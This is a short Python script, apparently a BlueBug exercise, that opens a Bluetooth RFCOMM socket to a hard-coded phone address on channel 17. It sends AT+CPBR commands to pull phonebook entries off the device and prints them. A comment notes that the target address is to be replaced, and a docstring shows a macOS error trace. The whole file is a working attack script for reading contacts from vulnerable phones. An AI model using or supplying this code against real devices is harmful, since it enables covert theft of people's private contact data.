# coding=UTF-8
import bluetooth

'''
can't run in mac os
Traceback (most recent call last):
  File "bluebug.py", line 6, in <module>
    phoneSock.connect((tgtPhone, port))
  File "build/bdist.macosx-10.11-x86_64/egg/bluetooth/osx.py", line 119, in connect
  File "build/bdist.macosx-10.11-x86_64/egg/lightblue/_bluetoothsockets.py", line 351, in connect
ValueError: depythonifying 'pointer', got 'tuple'
'''
tgtPhone = '80:EA:96:8E:69:A7'#这个得改成你自己的
port = 17
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))
for contact in range(1, 5):
    atCmd = 'AT+CPBR=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = phoneSock.recv(1024)
    print '[+] ' + str(contact) + ': ' + result
phoneSock.close()